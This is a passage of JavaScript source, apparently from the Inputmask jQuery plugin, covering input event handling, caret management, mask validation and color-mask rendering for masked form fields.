              if ($.isFunction(opts.onBeforePaste)) {
                pasteValue = opts.onBeforePaste.call(inputmask, inputValue, opts);
                if (pasteValue === false) {
                  return e.preventDefault();
                }
                if (!pasteValue) {
                  pasteValue = inputValue;
                }
              }
              checkVal(input, false, false, pasteValue.toString().split(""));
              writeBuffer(input, getBuffer(), seekNext(getLastValidPosition()), e, undoValue !== getBuffer().join(""));
              return e.preventDefault();
            },
            inputFallBackEvent: function inputFallBackEvent(e) {
              function radixPointHandler(input, inputValue, caretPos) {
                if (inputValue.charAt(caretPos.begin - 1) === "." && opts.radixPoint !== "") {
                  inputValue = inputValue.split("");
                  inputValue[caretPos.begin - 1] = opts.radixPoint.charAt(0);
                  inputValue = inputValue.join("");
                }
                return inputValue;
              }
              function ieMobileHandler(input, inputValue, caretPos) {
                if (iemobile) {
                  var inputChar = inputValue.replace(getBuffer().join(""), "");
                  if (inputChar.length === 1) {
                    var iv = inputValue.split("");
                    iv.splice(caretPos.begin, 0, inputChar);
                    inputValue = iv.join("");
                  }
                }
                return inputValue;
              }
              var input = this,
                inputValue = input.inputmask._valueGet();
              if (getBuffer().join("") !== inputValue) {
                var caretPos = caret(input);
                inputValue = radixPointHandler(input, inputValue, caretPos);
                inputValue = ieMobileHandler(input, inputValue, caretPos);
                if (getBuffer().join("") !== inputValue) {
                  var buffer = getBuffer().join(""),
                    offset = !opts.numericInput && inputValue.length > buffer.length ? -1 : 0,
                    frontPart = inputValue.substr(0, caretPos.begin),
                    backPart = inputValue.substr(caretPos.begin),
                    frontBufferPart = buffer.substr(0, caretPos.begin + offset),
                    backBufferPart = buffer.substr(caretPos.begin + offset);
                  var selection = caretPos,
                    entries = "",
                    isEntry = false;
                  if (frontPart !== frontBufferPart) {
                    var fpl = (isEntry = frontPart.length >= frontBufferPart.length) ? frontPart.length : frontBufferPart.length,
                      i;
                    for (i = 0; frontPart.charAt(i) === frontBufferPart.charAt(i) && i < fpl; i++) {}
                    if (isEntry) {
                      selection.begin = i - offset;
                      entries += frontPart.slice(i, selection.end);
                    }
                  }
                  if (backPart !== backBufferPart) {
                    if (backPart.length > backBufferPart.length) {
                      entries += backPart.slice(0, 1);
                    } else {
                      if (backPart.length < backBufferPart.length) {
                        selection.end += backBufferPart.length - backPart.length;
                        if (!isEntry && opts.radixPoint !== "" && backPart === "" && frontPart.charAt(selection.begin + offset - 1) === opts.radixPoint) {
                          selection.begin--;
                          entries = opts.radixPoint;
                        }
                      }
                    }
                  }
                  writeBuffer(input, getBuffer(), {
                    begin: selection.begin + offset,
                    end: selection.end + offset
                  });
                  if (entries.length > 0) {
                    $.each(entries.split(""), function (ndx, entry) {
                      var keypress = new $.Event("keypress");
                      keypress.which = entry.charCodeAt(0);
                      ignorable = false;
                      EventHandlers.keypressEvent.call(input, keypress);
                    });
                  } else {
                    if (selection.begin === selection.end - 1) {
                      selection.begin = seekPrevious(selection.begin + 1);
                      if (selection.begin === selection.end - 1) {
                        caret(input, selection.begin);
                      } else {
                        caret(input, selection.begin, selection.end);
                      }
                    }
                    var keydown = new $.Event("keydown");
                    keydown.keyCode = opts.numericInput ? Inputmask.keyCode.BACKSPACE : Inputmask.keyCode.DELETE;
                    EventHandlers.keydownEvent.call(input, keydown);
                  }
                  e.preventDefault();
                }
              }
            },
            beforeInputEvent: function beforeInputEvent(e) {
              if (e.cancelable) {
                var input = this;
                switch (e.inputType) {
                  case "insertText":
                    $.each(e.data.split(""), function (ndx, entry) {
                      var keypress = new $.Event("keypress");
                      keypress.which = entry.charCodeAt(0);
                      ignorable = false;
                      EventHandlers.keypressEvent.call(input, keypress);
                    });
                    return e.preventDefault();
                  case "deleteContentBackward":
                    var keydown = new $.Event("keydown");
                    keydown.keyCode = Inputmask.keyCode.BACKSPACE;
                    EventHandlers.keydownEvent.call(input, keydown);
                    return e.preventDefault();
                  case "deleteContentForward":
                    var keydown = new $.Event("keydown");
                    keydown.keyCode = Inputmask.keyCode.DELETE;
                    EventHandlers.keydownEvent.call(input, keydown);
                    return e.preventDefault();
                }
              }
            },
            setValueEvent: function setValueEvent(e) {
              this.inputmask.refreshValue = false;
              var input = this,
                value = e && e.detail ? e.detail[0] : arguments[1],
                value = value || input.inputmask._valueGet(true);
              if ($.isFunction(opts.onBeforeMask)) value = opts.onBeforeMask.call(inputmask, value, opts) || value;
              value = value.split("");
              checkVal(input, true, false, value);
              undoValue = getBuffer().join("");
              if ((opts.clearMaskOnLostFocus || opts.clearIncomplete) && input.inputmask._valueGet() === getBufferTemplate().join("")) {
                input.inputmask._valueSet("");
              }
            },
            focusEvent: function focusEvent(e) {
              var input = this,
                nptValue = input.inputmask._valueGet();
              if (opts.showMaskOnFocus && (!opts.showMaskOnHover || opts.showMaskOnHover && nptValue === "")) {
                if (input.inputmask._valueGet() !== getBuffer().join("")) {
                  writeBuffer(input, getBuffer(), seekNext(getLastValidPosition()));
                } else if (mouseEnter === false) {
                  caret(input, seekNext(getLastValidPosition()));
                }
              }
              if (opts.positionCaretOnTab === true && mouseEnter === false) {
                EventHandlers.clickEvent.apply(input, [e, true]);
              }
              undoValue = getBuffer().join("");
            },
            mouseleaveEvent: function mouseleaveEvent(e) {
              var input = this;
              mouseEnter = false;
              if (opts.clearMaskOnLostFocus && document.activeElement !== input) {
                input.placeholder = originalPlaceholder;
              }
            },
            clickEvent: function clickEvent(e, tabbed) {
              function doRadixFocus(clickPos) {
                if (opts.radixPoint !== "") {
                  var vps = getMaskSet().validPositions;
                  if (vps[clickPos] === undefined || vps[clickPos].input === getPlaceholder(clickPos)) {
                    if (clickPos < seekNext(-1)) return true;
                    var radixPos = $.inArray(opts.radixPoint, getBuffer());
                    if (radixPos !== -1) {
                      for (var vp in vps) {
                        if (radixPos < vp && vps[vp].input !== getPlaceholder(vp)) {
                          return false;
                        }
                      }
                      return true;
                    }
                  }
                }
                return false;
              }
              var input = this;
              setTimeout(function () {
                if (document.activeElement === input) {
                  var selectedCaret = caret(input);
                  if (tabbed) {
                    if (isRTL) {
                      selectedCaret.end = selectedCaret.begin;
                    } else {
                      selectedCaret.begin = selectedCaret.end;
                    }
                  }
                  if (selectedCaret.begin === selectedCaret.end) {
                    switch (opts.positionCaretOnClick) {
                      case "none":
                        break;
                      case "select":
                        caret(input, 0, getBuffer().length);
                        break;
                      case "ignore":
                        caret(input, seekNext(getLastValidPosition()));
                        break;
                      case "radixFocus":
                        if (doRadixFocus(selectedCaret.begin)) {
                          var radixPos = getBuffer().join("").indexOf(opts.radixPoint);
                          caret(input, opts.numericInput ? seekNext(radixPos) : radixPos);
                          break;
                        }
                      default:
                        var clickPosition = selectedCaret.begin,
                          lvclickPosition = getLastValidPosition(clickPosition, true),
                          lastPosition = seekNext(lvclickPosition);
                        if (clickPosition < lastPosition) {
                          caret(input, !isMask(clickPosition, true) && !isMask(clickPosition - 1, true) ? seekNext(clickPosition) : clickPosition);
                        } else {
                          var lvp = getMaskSet().validPositions[lvclickPosition],
                            tt = getTestTemplate(lastPosition, lvp ? lvp.match.locator : undefined, lvp),
                            placeholder = getPlaceholder(lastPosition, tt.match);
                          if (placeholder !== "" && getBuffer()[lastPosition] !== placeholder && tt.match.optionalQuantifier !== true && tt.match.newBlockMarker !== true || !isMask(lastPosition, opts.keepStatic) && tt.match.def === placeholder) {
                            var newPos = seekNext(lastPosition);
                            if (clickPosition >= newPos || clickPosition === lastPosition) {
                              lastPosition = newPos;
                            }
                          }
                          caret(input, lastPosition);
                        }
                        break;
                    }
                  }
                }
              }, 0);
            },
            cutEvent: function cutEvent(e) {
              var input = this,
                $input = $(input),
                pos = caret(input),
                ev = e.originalEvent || e;
              var clipboardData = window.clipboardData || ev.clipboardData,
                clipData = isRTL ? getBuffer().slice(pos.end, pos.begin) : getBuffer().slice(pos.begin, pos.end);
              clipboardData.setData("text", isRTL ? clipData.reverse().join("") : clipData.join(""));
              if (document.execCommand) document.execCommand("copy");
              handleRemove(input, Inputmask.keyCode.DELETE, pos);
              writeBuffer(input, getBuffer(), getMaskSet().p, e, undoValue !== getBuffer().join(""));
            },
            blurEvent: function blurEvent(e) {
              var $input = $(this),
                input = this;
              if (input.inputmask) {
                input.placeholder = originalPlaceholder;
                var nptValue = input.inputmask._valueGet(),
                  buffer = getBuffer().slice();
                if (nptValue !== "" || colorMask !== undefined) {
                  if (opts.clearMaskOnLostFocus) {
                    if (getLastValidPosition() === -1 && nptValue === getBufferTemplate().join("")) {
                      buffer = [];
                    } else {
                      clearOptionalTail(buffer);
                    }
                  }
                  if (isComplete(buffer) === false) {
                    setTimeout(function () {
                      $input.trigger("incomplete");
                    }, 0);
                    if (opts.clearIncomplete) {
                      resetMaskSet();
                      if (opts.clearMaskOnLostFocus) {
                        buffer = [];
                      } else {
                        buffer = getBufferTemplate().slice();
                      }
                    }
                  }
                  writeBuffer(input, buffer, undefined, e);
                }
                if (undoValue !== getBuffer().join("")) {
                  undoValue = buffer.join("");
                  $input.trigger("change");
                }
              }
            },
            mouseenterEvent: function mouseenterEvent(e) {
              var input = this;
              mouseEnter = true;
              if (document.activeElement !== input && opts.showMaskOnHover) {
                input.placeholder = (isRTL ? getBuffer().slice().reverse() : getBuffer()).join("");
              }
            },
            submitEvent: function submitEvent(e) {
              if (undoValue !== getBuffer().join("")) {
                $el.trigger("change");
              }
              if (opts.clearMaskOnLostFocus && getLastValidPosition() === -1 && el.inputmask._valueGet && el.inputmask._valueGet() === getBufferTemplate().join("")) {
                el.inputmask._valueSet("");
              }
              if (opts.clearIncomplete && isComplete(getBuffer()) === false) {
                el.inputmask._valueSet("");
              }
              if (opts.removeMaskOnSubmit) {
                el.inputmask._valueSet(el.inputmask.unmaskedvalue(), true);
                setTimeout(function () {
                  writeBuffer(el, getBuffer());
                }, 0);
              }
            },
            resetEvent: function resetEvent(e) {
              el.inputmask.refreshValue = true;
              setTimeout(function () {
                $el.trigger("setvalue");
              }, 0);
            }
          };
          function checkVal(input, writeOut, strict, nptvl, initiatingEvent) {
            var inputmask = this || input.inputmask,
              inputValue = nptvl.slice(),
              charCodes = "",
              initialNdx = -1,
              result = undefined;
            function isTemplateMatch(ndx, charCodes) {
              var charCodeNdx = getMaskTemplate(true, 0, false).slice(ndx, seekNext(ndx)).join("").replace(/'/g, "").indexOf(charCodes);
              return charCodeNdx !== -1 && !isMask(ndx) && (getTest(ndx).match.nativeDef === charCodes.charAt(0) || getTest(ndx).match.fn === null && getTest(ndx).match.nativeDef === "'" + charCodes.charAt(0) || getTest(ndx).match.nativeDef === " " && (getTest(ndx + 1).match.nativeDef === charCodes.charAt(0) || getTest(ndx + 1).match.fn === null && getTest(ndx + 1).match.nativeDef === "'" + charCodes.charAt(0)));
            }
            resetMaskSet();
            if (!strict && opts.autoUnmask !== true) {
              var staticInput = getBufferTemplate().slice(0, seekNext(-1)).join(""),
                matches = inputValue.join("").match(new RegExp("^" + Inputmask.escapeRegex(staticInput), "g"));
              if (matches && matches.length > 0) {
                inputValue.splice(0, matches.length * staticInput.length);
                initialNdx = seekNext(initialNdx);
              }
            } else {
              initialNdx = seekNext(initialNdx);
            }
            if (initialNdx === -1) {
              getMaskSet().p = seekNext(initialNdx);
              initialNdx = 0;
            } else getMaskSet().p = initialNdx;
            inputmask.caretPos = {
              begin: initialNdx
            };
            $.each(inputValue, function (ndx, charCode) {
              if (charCode !== undefined) {
                if (getMaskSet().validPositions[ndx] === undefined && inputValue[ndx] === getPlaceholder(ndx) && isMask(ndx, true) && isValid(ndx, inputValue[ndx], true, undefined, undefined, true) === false) {
                  getMaskSet().p++;
                } else {
                  var keypress = new $.Event("_checkval");
                  keypress.which = charCode.charCodeAt(0);
                  charCodes += charCode;
                  var lvp = getLastValidPosition(undefined, true);
                  if (!isTemplateMatch(initialNdx, charCodes)) {
                    result = EventHandlers.keypressEvent.call(input, keypress, true, false, strict, inputmask.caretPos.begin);
                    if (result) {
                      initialNdx = inputmask.caretPos.begin + 1;
                      charCodes = "";
                    }
                  } else {
                    result = EventHandlers.keypressEvent.call(input, keypress, true, false, strict, lvp + 1);
                  }
                  if (result) {
                    writeBuffer(undefined, getBuffer(), result.forwardPosition, keypress, false);
                    inputmask.caretPos = {
                      begin: result.forwardPosition,
                      end: result.forwardPosition
                    };
                  }
                }
              }
            });
            if (writeOut) writeBuffer(input, getBuffer(), result ? result.forwardPosition : undefined, initiatingEvent || new $.Event("checkval"), initiatingEvent && initiatingEvent.type === "input");
          }
          function unmaskedvalue(input) {
            if (input) {
              if (input.inputmask === undefined) {
                return input.value;
              }
              if (input.inputmask && input.inputmask.refreshValue) {
                EventHandlers.setValueEvent.call(input);
              }
            }
            var umValue = [],
              vps = getMaskSet().validPositions;
            for (var pndx in vps) {
              if (vps[pndx].match && vps[pndx].match.fn != null) {
                umValue.push(vps[pndx].input);
              }
            }
            var unmaskedValue = umValue.length === 0 ? "" : (isRTL ? umValue.reverse() : umValue).join("");
            if ($.isFunction(opts.onUnMask)) {
              var bufferValue = (isRTL ? getBuffer().slice().reverse() : getBuffer()).join("");
              unmaskedValue = opts.onUnMask.call(inputmask, bufferValue, unmaskedValue, opts);
            }
            return unmaskedValue;
          }
          function caret(input, begin, end, notranslate) {
            function translatePosition(pos) {
              if (isRTL && typeof pos === "number" && (!opts.greedy || opts.placeholder !== "") && el) {
                pos = el.inputmask._valueGet().length - pos;
              }
              return pos;
            }
            var range;
            if (begin !== undefined) {
              if ($.isArray(begin)) {
                end = isRTL ? begin[0] : begin[1];
                begin = isRTL ? begin[1] : begin[0];
              }
              if (begin.begin !== undefined) {
                end = isRTL ? begin.begin : begin.end;
                begin = isRTL ? begin.end : begin.begin;
              }
              if (typeof begin === "number") {
                begin = notranslate ? begin : translatePosition(begin);
                end = notranslate ? end : translatePosition(end);
                end = typeof end == "number" ? end : begin;
                var scrollCalc = parseInt(((input.ownerDocument.defaultView || window).getComputedStyle ? (input.ownerDocument.defaultView || window).getComputedStyle(input, null) : input.currentStyle).fontSize) * end;
                input.scrollLeft = scrollCalc > input.scrollWidth ? scrollCalc : 0;
                input.inputmask.caretPos = {
                  begin: begin,
                  end: end
                };
                if (input === document.activeElement) {
                  if ("selectionStart" in input) {
                    input.selectionStart = begin;
                    input.selectionEnd = end;
                  } else if (window.getSelection) {
                    range = document.createRange();
                    if (input.firstChild === undefined || input.firstChild === null) {
                      var textNode = document.createTextNode("");
                      input.appendChild(textNode);
                    }
                    range.setStart(input.firstChild, begin < input.inputmask._valueGet().length ? begin : input.inputmask._valueGet().length);
                    range.setEnd(input.firstChild, end < input.inputmask._valueGet().length ? end : input.inputmask._valueGet().length);
                    range.collapse(true);
                    var sel = window.getSelection();
                    sel.removeAllRanges();
                    sel.addRange(range);
                  } else if (input.createTextRange) {
                    range = input.createTextRange();
                    range.collapse(true);
                    range.moveEnd("character", end);
                    range.moveStart("character", begin);
                    range.select();
                  }
                  renderColorMask(input, {
                    begin: begin,
                    end: end
                  });
                }
              }
            } else {
              if ("selectionStart" in input) {
                begin = input.selectionStart;
                end = input.selectionEnd;
              } else if (window.getSelection) {
                range = window.getSelection().getRangeAt(0);
                if (range.commonAncestorContainer.parentNode === input || range.commonAncestorContainer === input) {
                  begin = range.startOffset;
                  end = range.endOffset;
                }
              } else if (document.selection && document.selection.createRange) {
                range = document.selection.createRange();
                begin = 0 - range.duplicate().moveStart("character", -input.inputmask._valueGet().length);
                end = begin + range.text.length;
              }
              return {
                begin: notranslate ? begin : translatePosition(begin),
                end: notranslate ? end : translatePosition(end)
              };
            }
          }
          function determineLastRequiredPosition(returnDefinition) {
            var buffer = getMaskTemplate(true, getLastValidPosition(), true, true),
              bl = buffer.length,
              pos,
              lvp = getLastValidPosition(),
              positions = {},
              lvTest = getMaskSet().validPositions[lvp],
              ndxIntlzr = lvTest !== undefined ? lvTest.locator.slice() : undefined,
              testPos;
            for (pos = lvp + 1; pos < buffer.length; pos++) {
              testPos = getTestTemplate(pos, ndxIntlzr, pos - 1);
              ndxIntlzr = testPos.locator.slice();
              positions[pos] = $.extend(true, {}, testPos);
            }
            var lvTestAlt = lvTest && lvTest.alternation !== undefined ? lvTest.locator[lvTest.alternation] : undefined;
            for (pos = bl - 1; pos > lvp; pos--) {
              testPos = positions[pos];
              if ((testPos.match.optionality || testPos.match.optionalQuantifier && testPos.match.newBlockMarker || lvTestAlt && (lvTestAlt !== positions[pos].locator[lvTest.alternation] && testPos.match.fn != null || testPos.match.fn === null && testPos.locator[lvTest.alternation] && checkAlternationMatch(testPos.locator[lvTest.alternation].toString().split(","), lvTestAlt.toString().split(",")) && getTests(pos)[0].def !== "")) && buffer[pos] === getPlaceholder(pos, testPos.match)) {
                bl--;
              } else break;
            }
            return returnDefinition ? {
              l: bl,
              def: positions[bl] ? positions[bl].match : undefined
            } : bl;
          }
          function clearOptionalTail(buffer) {
            buffer.length = 0;
            var template = getMaskTemplate(true, 0, true, undefined, true),
              lmnt,
              validPos;
            while (lmnt = template.shift(), lmnt !== undefined) {
              buffer.push(lmnt);
            }
            return buffer;
          }
          function isComplete(buffer) {
            if ($.isFunction(opts.isComplete)) return opts.isComplete(buffer, opts);
            if (opts.repeat === "*") return undefined;
            var complete = false,
              lrp = determineLastRequiredPosition(true),
              aml = seekPrevious(lrp.l);
            if (lrp.def === undefined || lrp.def.newBlockMarker || lrp.def.optionality || lrp.def.optionalQuantifier) {
              complete = true;
              for (var i = 0; i <= aml; i++) {
                var test = getTestTemplate(i).match;
                if (test.fn !== null && getMaskSet().validPositions[i] === undefined && test.optionality !== true && test.optionalQuantifier !== true || test.fn === null && buffer[i] !== getPlaceholder(i, test)) {
                  complete = false;
                  break;
                }
              }
            }
            return complete;
          }
          function handleRemove(input, k, pos, strict, fromIsValid) {
            if (opts.numericInput || isRTL) {
              if (k === Inputmask.keyCode.BACKSPACE) {
                k = Inputmask.keyCode.DELETE;
              } else if (k === Inputmask.keyCode.DELETE) {
                k = Inputmask.keyCode.BACKSPACE;
              }
              if (isRTL) {
                var pend = pos.end;
                pos.end = pos.begin;
                pos.begin = pend;
              }
            }
            if (k === Inputmask.keyCode.BACKSPACE && pos.end - pos.begin < 1) {
              pos.begin = seekPrevious(pos.begin);
              if (getMaskSet().validPositions[pos.begin] !== undefined && getMaskSet().validPositions[pos.begin].input === opts.groupSeparator) {
                pos.begin--;
              }
            } else if (k === Inputmask.keyCode.DELETE && pos.begin === pos.end) {
              pos.end = isMask(pos.end, true) && getMaskSet().validPositions[pos.end] && getMaskSet().validPositions[pos.end].input !== opts.radixPoint ? pos.end + 1 : seekNext(pos.end) + 1;
              if (getMaskSet().validPositions[pos.begin] !== undefined && getMaskSet().validPositions[pos.begin].input === opts.groupSeparator) {
                pos.end++;
              }
            }
            revalidateMask(pos);
            if (strict !== true && opts.keepStatic !== false || opts.regex !== null) {
              var result = alternate(true);
              if (result) {
                var newPos = result.caret !== undefined ? result.caret : result.pos ? seekNext(result.pos.begin ? result.pos.begin : result.pos) : getLastValidPosition(-1, true);
                if (k !== Inputmask.keyCode.DELETE || pos.begin > newPos) {
                  pos.begin == newPos;
                }
              }
            }
            var lvp = getLastValidPosition(pos.begin, true);
            if (lvp < pos.begin || pos.begin === -1) {
              getMaskSet().p = seekNext(lvp);
            } else if (strict !== true) {
              getMaskSet().p = pos.begin;
              if (fromIsValid !== true) {
                while (getMaskSet().p < lvp && getMaskSet().validPositions[getMaskSet().p] === undefined) {
                  getMaskSet().p++;
                }
              }
            }
          }
          function initializeColorMask(input) {
            var computedStyle = (input.ownerDocument.defaultView || window).getComputedStyle(input, null);
            function findCaretPos(clientx) {
              var e = document.createElement("span"),
                caretPos;
              for (var style in computedStyle) {
                if (isNaN(style) && style.indexOf("font") !== -1) {
                  e.style[style] = computedStyle[style];
                }
              }
              e.style.textTransform = computedStyle.textTransform;
              e.style.letterSpacing = computedStyle.letterSpacing;
              e.style.position = "absolute";
              e.style.height = "auto";
              e.style.width = "auto";
              e.style.visibility = "hidden";
              e.style.whiteSpace = "nowrap";
              document.body.appendChild(e);
              var inputText = input.inputmask._valueGet(),
                previousWidth = 0,
                itl;
              for (caretPos = 0, itl = inputText.length; caretPos <= itl; caretPos++) {
                e.innerHTML += inputText.charAt(caretPos) || "_";
                if (e.offsetWidth >= clientx) {
                  var offset1 = clientx - previousWidth;
                  var offset2 = e.offsetWidth - clientx;
                  e.innerHTML = inputText.charAt(caretPos);
                  offset1 -= e.offsetWidth / 3;
                  caretPos = offset1 < offset2 ? caretPos - 1 : caretPos;
                  break;
                }
                previousWidth = e.offsetWidth;
              }
              document.body.removeChild(e);
              return caretPos;
            }
            var template = document.createElement("div");
            template.style.width = computedStyle.width;
            template.style.textAlign = computedStyle.textAlign;
            colorMask = document.createElement("div");
            input.inputmask.colorMask = colorMask;
            colorMask.className = "im-colormask";
            input.parentNode.insertBefore(colorMask, input);
            input.parentNode.removeChild(input);
            colorMask.appendChild(input);
            colorMask.appendChild(template);
            input.style.left = template.offsetLeft + "px";
            $(colorMask).on("mouseleave", function (e) {
              return EventHandlers.mouseleaveEvent.call(input, [e]);
            });
            $(colorMask).on("mouseenter", function (e) {
              return EventHandlers.mouseenterEvent.call(input, [e]);
            });
            $(colorMask).on("click", function (e) {
              caret(input, findCaretPos(e.clientX));
              return EventHandlers.clickEvent.call(input, [e]);
            });
          }
          Inputmask.prototype.positionColorMask = function (input, template) {
            input.style.left = template.offsetLeft + "px";
          };
          function renderColorMask(input, caretPos, clear) {
            var maskTemplate = [],
              isStatic = false,
              test,
              testPos,
              ndxIntlzr,
              pos = 0;
            function setEntry(entry) {
              if (entry === undefined) entry = "";
              if (!isStatic && (test.fn === null || testPos.input === undefined)) {
                isStatic = true;
                maskTemplate.push("<span class='im-static'>" + entry);
              } else if (isStatic && (test.fn !== null && testPos.input !== undefined || test.def === "")) {
                isStatic = false;
                var mtl = maskTemplate.length;
                maskTemplate[mtl - 1] = maskTemplate[mtl - 1] + "</span>";
                maskTemplate.push(entry);
              } else maskTemplate.push(entry);
            }
            function setCaret() {
              if (document.activeElement === input) {
                maskTemplate.splice(caretPos.begin, 0, caretPos.begin === caretPos.end || caretPos.end > getMaskSet().maskLength ? '<mark class="im-caret" style="border-right-width: 1px;border-right-style: solid;">' : '<mark class="im-caret-select">');
                maskTemplate.splice(caretPos.end + 1, 0, "</mark>");
              }
            }
            if (colorMask !== undefined) {
              var buffer = getBuffer();
              if (caretPos === undefined) {
                caretPos = caret(input);
              } else if (caretPos.begin === undefined) {
                caretPos = {
                  begin: caretPos,
                  end: caretPos
                };
              }
              if (clear !== true) {
                var lvp = getLastValidPosition();
                do {
                  if (getMaskSet().validPositions[pos]) {
                    testPos = getMaskSet().validPositions[pos];
                    test = testPos.match;
                    ndxIntlzr = testPos.locator.slice();
                    setEntry(buffer[pos]);
                  } else {
                    testPos = getTestTemplate(pos, ndxIntlzr, pos - 1);
                    test = testPos.match;
                    ndxIntlzr = testPos.locator.slice();
                    if (opts.jitMasking === false || pos < lvp || typeof opts.jitMasking === "number" && isFinite(opts.jitMasking) && opts.jitMasking > pos) {
                      setEntry(getPlaceholder(pos, test));
                    } else isStatic = false;
                  }
                  pos++;
                } while ((maxLength === undefined || pos < maxLength) && (test.fn !== null || test.def !== "") || lvp > pos || isStatic);
                if (isStatic) setEntry();
                setCaret();
              }
              var template = colorMask.getElementsByTagName("div")[0];
              template.innerHTML = maskTemplate.join("");
              input.inputmask.positionColorMask(input, template);
            }
          }
          function mask(elem) {
            function isElementTypeSupported(input, opts) {
              function patchValueProperty(npt) {
                var valueGet;
                var valueSet;
                function patchValhook(type) {
                  if ($.valHooks && ($.valHooks[type] === undefined || $.valHooks[type].inputmaskpatch !== true)) {
                    var valhookGet = $.valHooks[type] && $.valHooks[type].get ? $.valHooks[type].get : function (elem) {
                      return elem.value;
                    };
                    var valhookSet = $.valHooks[type] && $.valHooks[type].set ? $.valHooks[type].set : function (elem, value) {
                      elem.value = value;
                      return elem;
                    };
                    $.valHooks[type] = {
                      get: function get(elem) {
                        if (elem.inputmask) {
                          if (elem.inputmask.opts.autoUnmask) {
                            return elem.inputmask.unmaskedvalue();
                          } else {
                            var result = valhookGet(elem);
                            return getLastValidPosition(undefined, undefined, elem.inputmask.maskset.validPositions) !== -1 || opts.nullable !== true ? result : "";
                          }
                        } else return valhookGet(elem);
                      },
                      set: function set(elem, value) {
                        var $elem = $(elem),
                          result;
                        result = valhookSet(elem, value);
                        if (elem.inputmask) {
                          $elem.trigger("setvalue", [value]);
                        }
                        return result;
                      },
                      inputmaskpatch: true
                    };
                  }
                }
                function getter() {
                  if (this.inputmask) {
                    return this.inputmask.opts.autoUnmask ? this.inputmask.unmaskedvalue() : getLastValidPosition() !== -1 || opts.nullable !== true ? document.activeElement === this && opts.clearMaskOnLostFocus ? (isRTL ? clearOptionalTail(getBuffer().slice()).reverse() : clearOptionalTail(getBuffer().slice())).join("") : valueGet.call(this) : "";
                  } else return valueGet.call(this);
                }
                function setter(value) {
                  valueSet.call(this, value);
                  if (this.inputmask) {
                    $(this).trigger("setvalue", [value]);
                  }
                }
                function installNativeValueSetFallback(npt) {
                  EventRuler.on(npt, "mouseenter", function (event) {
                    var $input = $(this),
                      input = this,
                      value = input.inputmask._valueGet();
                    if (value !== getBuffer().join("")) {
                      $input.trigger("setvalue");
                    }
                  });
                }
                if (!npt.inputmask.__valueGet) {
                  if (opts.noValuePatching !== true) {
                    if (Object.getOwnPropertyDescriptor) {
                      if (typeof Object.getPrototypeOf !== "function") {
                        Object.getPrototypeOf = _typeof("test".__proto__) === "object" ? function (object) {
                          return object.__proto__;
                        } : function (object) {
                          return object.constructor.prototype;
                        };
                      }
                      var valueProperty = Object.getPrototypeOf ? Object.getOwnPropertyDescriptor(Object.getPrototypeOf(npt), "value") : undefined;
                      if (valueProperty && valueProperty.get && valueProperty.set) {
                        valueGet = valueProperty.get;
                        valueSet = valueProperty.set;
                        Object.defineProperty(npt, "value", {
                          get: getter,
                          set: setter,
                          configurable: true
                        });
                      } else if (npt.tagName !== "INPUT") {
                        valueGet = function valueGet() {
                          return this.textContent;
                        };
                        valueSet = function valueSet(value) {
                          this.textContent = value;
                        };
                        Object.defineProperty(npt, "value", {
                          get: getter,
                          set: setter,
                          configurable: true
                        });
                      }
                    } else if (document.__lookupGetter__ && npt.__lookupGetter__("value")) {
                      valueGet = npt.__lookupGetter__("value");
                      valueSet = npt.__lookupSetter__("value");
                      npt.__defineGetter__("value", getter);
                      npt.__defineSetter__("value", setter);
                    }
                    npt.inputmask.__valueGet = valueGet;
                    npt.inputmask.__valueSet = valueSet;
                  }
                  npt.inputmask._valueGet = function (overruleRTL) {
                    return isRTL && overruleRTL !== true ? valueGet.call(this.el).split("").reverse().join("") : valueGet.call(this.el);
                  };
                  npt.inputmask._valueSet = function (value, overruleRTL) {
                    valueSet.call(this.el, value === null || value === undefined ? "" : overruleRTL !== true && isRTL ? value.split("").reverse().join("") : value);
                  };
                  if (valueGet === undefined) {
                    valueGet = function valueGet() {
                      return this.value;
                    };
                    valueSet = function valueSet(value) {
                      this.value = value;
                    };
                    patchValhook(npt.type);
                    installNativeValueSetFallback(npt);
                  }
                }
              }
              var elementType = input.getAttribute("type");
              var isSupported = input.tagName === "INPUT" && $.inArray(elementType, opts.supportsInputType) !== -1 || input.isContentEditable || input.tagName === "TEXTAREA";
              if (!isSupported) {
                if (input.tagName === "INPUT") {
                  var el = document.createElement("input");
                  el.setAttribute("type", elementType);
                  isSupported = el.type === "text";
                  el = null;
                } else isSupported = "partial";
              }
              if (isSupported !== false) {
                patchValueProperty(input);
              } else input.inputmask = undefined;
              return isSupported;
            }
            EventRuler.off(elem);
            var isSupported = isElementTypeSupported(elem, opts);
            if (isSupported !== false) {
              el = elem;
              $el = $(el);
              originalPlaceholder = el.placeholder;
              maxLength = el !== undefined ? el.maxLength : undefined;
              if (maxLength === -1) maxLength = undefined;
              if (opts.colorMask === true) {
                initializeColorMask(el);
              }
              if (mobile) {
                if ("inputmode" in el) {
                  el.inputmode = opts.inputmode;
                  el.setAttribute("inputmode", opts.inputmode);
                }
                if (opts.disablePredictiveText === true) {
                  if ("autocorrect" in el) {
                    el.autocorrect = false;
                  } else {
                    if (opts.colorMask !== true) {
                      initializeColorMask(el);
                    }
                    el.type = "password";
                  }
                }
              }
              if (isSupported === true) {
                el.setAttribute("im-insert", opts.insertMode);
                EventRuler.on(el, "submit", EventHandlers.submitEvent);
                EventRuler.on(el, "reset", EventHandlers.resetEvent);
                EventRuler.on(el, "blur", EventHandlers.blurEvent);
                EventRuler.on(el, "focus", EventHandlers.focusEvent);
                if (opts.colorMask !== true) {
                  EventRuler.on(el, "click", EventHandlers.clickEvent);
                  EventRuler.on(el, "mouseleave", EventHandlers.mouseleaveEvent);
                  EventRuler.on(el, "mouseenter", EventHandlers.mouseenterEvent);
                }
                EventRuler.on(el, "paste", EventHandlers.pasteEvent);
                EventRuler.on(el, "cut", EventHandlers.cutEvent);
                EventRuler.on(el, "complete", opts.oncomplete);
                EventRuler.on(el, "incomplete", opts.onincomplete);
                EventRuler.on(el, "cleared", opts.oncleared);
                if (!mobile && opts.inputEventOnly !== true) {
                  EventRuler.on(el, "keydown", EventHandlers.keydownEvent);
                  EventRuler.on(el, "keypress", EventHandlers.keypressEvent);
                } else {
                  el.removeAttribute("maxLength");
                }
                EventRuler.on(el, "input", EventHandlers.inputFallBackEvent);
                EventRuler.on(el, "beforeinput", EventHandlers.beforeInputEvent);
              }
              EventRuler.on(el, "setvalue", EventHandlers.setValueEvent);
              undoValue = getBufferTemplate().join("");
              if (el.inputmask._valueGet(true) !== "" || opts.clearMaskOnLostFocus === false || document.activeElement === el) {
